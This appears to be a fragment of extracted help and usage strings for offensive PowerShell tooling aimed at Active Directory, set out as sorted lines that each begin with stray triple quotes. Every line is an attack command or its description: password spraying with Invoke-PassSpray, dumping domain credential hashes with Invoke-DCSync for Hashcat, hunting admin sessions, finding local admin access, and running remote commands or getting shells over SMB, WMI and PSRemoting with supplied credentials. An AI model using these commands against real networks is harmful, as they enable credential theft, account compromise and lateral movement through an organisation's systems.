"""                      Specify your targets - comma separated hostnames"
"""                     Specify your targets - comma separated hostnames"
"""        Specify Credentials and gain a shell as that user"
"""       Specify Credentials and gain a shell as that user"
"""    Access_Check -Method PSRemoting -Command `"
"""    Access_Check -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Access_Check -Method PSRemoting -Targets `"
"""    Access_Check -Method PSRemoting"
"""    Access_Check -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Access_Check -Method SMB -Targets `"
"""    Access_Check -Method SMB"
"""    Do not run as local user (e.g.: nt authority\system) unless you specify credentials (WMI only)"
"""    Do not set $computerNameOnly as target if using WMI."
"""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami' -NoOutput"
"""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami'"
"""    Find-LocalAdminAccess -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Find-LocalAdminAccess -Method PSRemoting -InLine"
"""    Find-LocalAdminAccess -Method PSRemoting -Targets `"
"""    Find-LocalAdminAccess -Method PSRemoting -UserName `"
"""    Find-LocalAdminAccess -Method PSRemoting"
"""    Find-LocalAdminAccess -Method SMB -Command 'whoami' -NoOutput"
"""    Find-LocalAdminAccess -Method SMB -Command 'whoami'"
"""    Find-LocalAdminAccess -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Find-LocalAdminAccess -Method SMB -InLine"
"""    Find-LocalAdminAccess -Method SMB -Targets `"
"""    Find-LocalAdminAccess -Method SMB"
"""    Find-LocalAdminAccess -Method WMI -Command 'whoami' -NoOutput"
"""    Find-LocalAdminAccess -Method WMI -Command 'whoami'"
"""    Find-LocalAdminAccess -Method WMI -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Find-LocalAdminAccess -Method WMI -InLine"
"""    Find-LocalAdminAccess -Method WMI -Targets `"
"""    Find-LocalAdminAccess -Method WMI -UserName `"
"""    Find-LocalAdminAccess -Method WMI"
"""    Invoke-Command -ComputerName Server01.ferrari.local -ScriptBlock {whoami}"
"""    Invoke-DCSync -Domain domain.local -DomainController DC01.domain.local"
"""    Invoke-DCSync -Hashcat"
"""    Invoke-DCSync"
"""    Invoke-PassSpray                             Spray an empty password across the Domain"
"""    Invoke-PassSpray -Password P@ssw0rd!         Spray a password across the Domain"
"""    Invoke-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Invoke-SMBRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"
"""    Invoke-SessionHunter -CheckAsAdmin -FailSafe"
"""    Invoke-SessionHunter -CheckAsAdmin -UserName 'ferrari\Administrator' -Password 'P@ssw0rd!'"
"""    Invoke-SessionHunter -CheckAsAdmin"
"""    Invoke-SessionHunter -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Invoke-SessionHunter"
"""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username '.\Administrator' -Password 'P@ssw0rd!'"
